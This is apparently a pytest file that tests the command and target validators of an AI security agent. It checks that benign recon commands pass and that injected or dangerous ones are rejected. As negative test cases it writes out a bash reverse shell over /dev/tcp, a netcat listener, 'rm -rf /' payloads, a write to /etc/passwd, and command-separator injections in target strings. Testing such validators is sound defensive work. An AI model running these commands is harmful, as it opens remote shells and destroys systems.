import pytest
from agent_brain import ElengenixAgent

def test_safe_command_validation():
 agent = ElengenixAgent()
 
 # Valid commands
 assert agent._is_safe_command("nmap -sV target.com") == True
 assert agent._is_safe_command("subfinder -d example.com") == True
 
 # Invalid commands (Unauthorized binary)
 assert agent._is_safe_command("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1") == False
 assert agent._is_safe_command("nc -lvnp 4444") == False
 
 # Invalid commands (Sandbox escape attempt)
 assert agent._is_safe_command("python3 -c 'import os; os.system(\"rm -rf /\")'") == False
 
 # Dangerous characters
 assert agent._is_safe_command("ls ; rm -rf /") == False
 assert agent._is_safe_command("echo hello > /etc/passwd") == False

def test_target_validation():
 from orchestrator import validate_target
 
 assert validate_target("example.com") == True
 assert validate_target("https://target-site.net/api/v1") == True
 
 # Potential injection in target
 assert validate_target("example.com; rm -rf /") == False
 assert validate_target("target.com | nmap") == False
